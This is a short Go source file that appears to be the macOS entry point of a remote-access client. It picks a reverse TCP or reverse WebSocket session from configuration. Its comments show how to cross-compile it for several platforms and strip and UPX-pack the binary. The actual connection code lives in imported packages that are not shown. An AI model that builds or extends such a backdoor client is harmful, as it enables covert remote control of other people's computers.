//go:build darwin

package main

import (
	"main/PcInfo"
	Protocol "main/Protocol/darwin"
)

func main() {

	PcInfo.GroupInfo = "MacOS"
	PcInfo.Init()
	switch PcInfo.Protocol {
	case "Session/Reverse_tcp":
		{
			Protocol.TcpRun()
		}
	case "Session/Reverse_Ws":
		{
			Protocol.WsRun()
		}
	}
}

//cmd:
//Linux：
//set GOOS=linux
//set GOARCH=amd64

//windows:
//set GOOS=windows
//set GOARCH=amd64

//powershell:
//Linux:
//$env:GOOS="linux"
//$env:GOARCH="amd64"
//Windows:
//$env:GOOS="windows"
//$env:GOARCH="amd64"

//CGO_ENABLED=0 GOOS=linux go build -a -ldflags="-s -w" -installsuffix cgo -o Winmain.exe main.go && upx -9 Client
//set GOARCH=mips
//set GOOS=linux

//MacOS
//set GOOS=darwin
//set GOARCH=amd64
